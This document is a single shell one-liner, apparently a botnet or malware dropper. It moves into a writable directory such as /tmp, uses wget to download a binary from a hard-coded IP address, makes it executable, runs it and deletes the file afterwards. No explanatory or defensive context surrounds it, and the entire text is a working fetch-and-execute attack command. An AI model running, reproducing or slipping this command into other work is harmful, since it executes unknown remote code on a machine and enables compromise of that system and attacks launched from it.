cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.154.191.146/ponydicks10; chmod +x ponydicks10; ./ponydicks10; rm -rf ponydicks10
